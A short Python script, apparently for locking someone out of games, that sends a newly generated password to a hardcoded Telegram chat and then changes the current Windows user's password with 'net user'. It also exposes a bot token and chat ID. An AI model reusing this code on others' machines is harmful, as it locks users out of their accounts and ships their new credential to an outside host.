import requests
import string
import random
import os
import time

token = "6127996240:AAEx7ZVnnUyarPpU0mTTCHx01KGW2nMEbWw"
chat_id = "-1001714960360"


def change_password_current_user(new_password):
    os.system(f"net user /password:{new_password}")


def generate_password(length=8, complexity=2):
    if complexity == 1:
        characters = string.digits
    elif complexity == 2:
        characters = string.ascii_letters + string.digits
    elif complexity == 3:
        characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password


def send_message_to_telegram(token, chat_id, text):
    url = f'https://api.telegram.org/bot{token}/sendMessage?&chat_id={chat_id}&text={text}'
    response = requests.get(url)
    return response.status_code


def update_bot_tg(token):
    url = f'https://api.telegram.org/bot{token}/getUpdates'
    response = requests.get(url)
    if response.status_code == 200:
        return requests.get(url).json()
    else:
        print("Failed to send message", response.status_code)

time.sleep(30)
password = generate_password()

text = f"Новый пароль на игры: {password}"
result = send_message_to_telegram(token, chat_id, text)
if result == 200:
    change_password_current_user(password)
print(update_bot_tg(token))
